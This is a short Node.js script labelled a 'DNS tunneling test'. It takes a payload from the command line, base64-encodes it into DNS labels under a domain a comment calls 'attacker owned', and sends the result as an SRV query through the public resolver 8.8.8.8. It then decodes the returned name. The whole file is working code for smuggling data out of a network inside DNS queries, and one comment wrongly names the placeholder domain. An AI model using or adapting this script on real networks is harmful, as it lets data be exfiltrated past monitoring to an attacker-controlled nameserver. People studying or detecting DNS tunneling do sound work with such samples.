// DNS tunneling test Script

const packet = require('dns-packet');
const dgram = require('dgram');
const  base64  =  require('base-64');
const  utf8  =  require('utf8');
const tld = 'dns.com'; // Attacker owned TLD. Using 'google.com' as a placeholder
var str = new String();
var str_extract = new String();

if (process.argv.length === 3 && process.argv[2].length <= 140) { // Provide an argument i.e. a payload not more than 140 characters/bytes. Each label in a FQDN can be 63 bytes and a complete FQDN has 256 bytes.
  var input = Buffer.from(process.argv[2]).toString('base64').replace(/=/g, '_'); // Encode to base64, base64 is the closest option when it comes to compliance with the DNS spec
  console.log("\n ...Size of uncompressed, base64 encoded input is: " + input.length); // Printing the number of encoded bytes
  for (i = 0; i < input.length; i += 62) {
    str += input.substr(i, 62) + "."; // Transform to the dotted notation
  }
  console.log('\n ...Fully qualified DNS hostname: ', str += tld); // Build a FQDN i.e. well formed DNS hostname
} else {
  console.log("Usage: " + __filename + " payload");
  process.exit(-1)
}

var socket = dgram.createSocket('udp4'); // Use dns-packet and a 3rd party socket abstraction module to send or receive DNS messages
var buff = packet.encode({
  type: 'query',
  id: 1234,
  flags: packet.RECURSION_DESIRED,
  questions: [{
    type: 'srv',
    name: str
  }]
});

console.log("\n ...Response begins:"); // Printing the number of encoded bytes
socket.on('message', function(message, rinfo) {
  console.log(rinfo); // Printing response info
  var hname_extract = packet.decode(message).questions[0].name;
  console.log("\n" + hname_extract);
  str_extract = Buffer.from(((hname_extract.replace(("." + tld), " ")).replace(/_/g, "=")), 'base64').toString(); // base64 decode and log included payload
  console.log("\n" + str_extract);
});

socket.send(buff, 0, buff.length, 53, '8.8.8.8');
